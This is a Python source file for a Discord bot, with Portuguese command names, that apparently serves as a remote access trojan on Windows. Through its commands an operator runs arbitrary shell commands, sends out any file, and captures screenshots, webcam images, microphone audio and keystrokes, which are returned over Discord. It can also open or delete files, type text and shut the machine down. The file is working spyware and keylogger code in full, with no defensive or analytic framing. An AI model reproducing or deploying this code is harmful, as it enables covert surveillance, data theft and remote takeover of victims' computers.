import discord, time, pyautogui, os, cv2,sounddevice
from discord.ext import commands
from pynput.keyboard import Listener, Key
from scipy.io.wavfile import write
usuario = os.getenv("USERNAME")
##########################################
client = commands.Bot(command_prefix='!')
user = discord.Client()

def log(text):
    with open('loggg.txt', 'a') as file_log:
        file_log.write(text)
def logkey(text):
    with open(rf"C:\Users\{usuario}\Pictures\keylogg.txt", 'a') as file_log:
        file_log.write(text)

def monitor(key):
    try:
        logkey(key.char)
    except AttributeError:
        if key == Key.space:
                logkey(' ')
        else:
            logkey(' <'+str(key)+'> ')
            print(key)
    if key == Key.esc:
        return False

@client.command(name='t')
async def escrever(ctx, *txt):
    time.sleep(1)
    for i in txt:
        pyautogui.write(f'{i} ')
    time.sleep(0.5)
    pyautogui.press('enter')

@client.command(name='print')
async def printa(ctx):
    time.sleep(1)
    foto = pyautogui.screenshot()
    foto.save('print.png')
    await ctx.send(file=discord.File(rf'print.png'))
    time.sleep(1)
    os.remove('print.png')

@client.command(name='abrir')
async def abrirr(ctx, arq):
    time.sleep(1)
    os.startfile(rf'PATH') # Ex: C:\Users\{usuario}\Desktop\{arq}

@client.command(name='apagar')
async def apagar(ctx, arq):
    time.sleep(1)
    os.remove(rf'PATH') # Ex: C:\Users\{usuario}\Desktop\{arq}

@client.command(name='fechar')
async def fechar(ctx):
    time.sleep(1)
    pyautogui.hotkey('alt', 'f4')

@client.command(name='txt')
async def txt(ctx, titulo, *msg):
    time.sleep(1)
    A=msg
    StrMsg=" ".join(A)
    with os.popen(f'echo {StrMsg} > C:\\Users\\{usuario}\\Desktop\\{titulo}.txt'):
        pass

@client.command(name='desligar')
async def desligar(ctx):
    time.sleep(1)
    os.popen(f'shutdown /s')

@client.command(name='cmd')
async def cmd(ctx, *comando):
    time.sleep(1)
    A = comando
    StrComando = " ".join(A)
    with os.popen(f'{StrComando}','r') as f:
        for i in f.readlines():
            log(i)
    await ctx.send(file=discord.File(rf'loggg.txt'))
    os.remove(rf'loggg.txt')

@client.command(name='file')
async def cmd(ctx, *file):
    time.sleep(1)
    A = file
    StrFile = " ".join(A)
    await ctx.send(file=discord.File(rf'{StrFile}'))

@client.command(name='webcam')
async def webcam(ctx):
    usuario = os.getenv("USERNAME")
    video = cv2.VideoCapture(0)
    check, frame = video.read()
    cv2.imwrite(rf"C:\Users\{usuario}\Pictures\webcam.png", frame)
    time.sleep(1)
    await ctx.send(file=discord.File(rf"C:\Users\{usuario}\Pictures\webcam.png"))
    time.sleep(1)
    os.remove(rf"C:\Users\{usuario}\Pictures\webcam.png")



@client.command(name='keylog')
async def keylog(ctx):
    with Listener(on_release=monitor) as listener:
        time.sleep(10)
        listener.stop()
        await ctx.send(file=discord.File(rf"C:\Users\{usuario}\Pictures\keylogg.txt"))
        time.sleep(1)
        os.remove(rf"C:\Users\{usuario}\Pictures\keylogg.txt")

@client.command(name='audiorec')
async def audiorec(ctx, tempo):
    usuario = os.getenv("USERNAME")
    fs = 44100
    second = int(tempo)
    print('recording...')
    record_voice = sounddevice.rec(int(second * fs), samplerate=fs, channels=2)
    sounddevice.wait()
    write(rf"C:\Users\{usuario}\Pictures\audiorec.wav", fs, record_voice)
    await ctx.send(file=discord.File(rf"C:\Users\{usuario}\Pictures\audiorec.wav"))
    time.sleep(1)
    os.remove(rf"C:\Users\{usuario}\Pictures\audiorec.wav")

client.run('TOKEN')
